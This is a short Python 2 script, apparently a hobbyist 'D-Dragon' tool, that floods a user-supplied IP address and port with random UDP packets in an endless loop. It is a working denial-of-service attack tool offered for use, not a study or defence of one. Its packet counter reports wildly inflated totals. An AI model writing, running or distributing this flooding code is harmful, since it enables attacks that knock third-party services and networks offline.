
import sys, os, time, socket, random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system('clear')
os.system('figlet LORIS')
print '\x1b[32;1m \nFrom   : Narsingdi [Bangladesh]\nAuthor : Himel\nTeam   : D-Dragon\nD-Dragon its not a name its brand\n'
print '\x1b[32;1m<=======================================>'
print '\x1b[34;1m||========>D-Dragon<=========||'
print '\x1b[32;1m<=======================================>'
print 'RECODE=Himel Gazi'
print
ip = raw_input('INPUT TARGET IP ===> ')
port = input('Port       ===> ')
os.system('clear')
os.system('figlet Loading..')
print 'takes 5 seconds'
time.sleep(5)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1000000000000000000L
    port = port + 0
    print '\x1b[32;1mSend %s packet ke %s throught port:%s' % (sent, ip, port)
    if port == 65534:
        port = 0
 